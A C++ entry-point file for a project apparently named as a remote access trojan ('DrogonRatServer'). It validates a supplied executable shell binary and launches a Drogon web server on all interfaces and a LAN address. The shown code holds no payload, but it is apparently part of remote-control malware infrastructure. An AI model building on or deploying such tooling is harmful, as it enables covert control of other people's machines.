#include "DrogonRatServer/Server.hpp"
#include "DrogonRatServer/debug.hpp"

#include <cstdlib>
#include <filesystem>

const std::filesystem::path &DB_FILE_PATH =
    std::filesystem::absolute(std::filesystem::current_path() / "data/data.db");

int main(int argc, char *argv[]) {
    if(argc != 2) {
        ERROR_LOG("Usage: {} <path_to_shell_binary>", argv[0]);
        return EXIT_FAILURE;
    }

    const std::filesystem::path shell_binary_path(argv[1]);
    if(!std::filesystem::exists(shell_binary_path)) {
        ERROR_LOG("Shell binary not found: {}", shell_binary_path.string());
        return EXIT_FAILURE;
    }

    if(!std::filesystem::is_regular_file(shell_binary_path)) {
        ERROR_LOG("Shell binary path is not a regular file: {}", shell_binary_path.string());
        return EXIT_FAILURE;
    }

    // Check if executable
    std::error_code ec;
    auto perms = std::filesystem::status(shell_binary_path, ec).permissions();
    if((perms & std::filesystem::perms::owner_exec) == std::filesystem::perms::none) {
        ERROR_LOG("Shell binary is not executable: {}", shell_binary_path.string());
        return EXIT_FAILURE;
    }
    DrogonRatServer::Server server(drogon::app(), DB_FILE_PATH, shell_binary_path);
    server.setIps({"0.0.0.0", "192.168.1.6"}).run();
    return EXIT_SUCCESS;
}
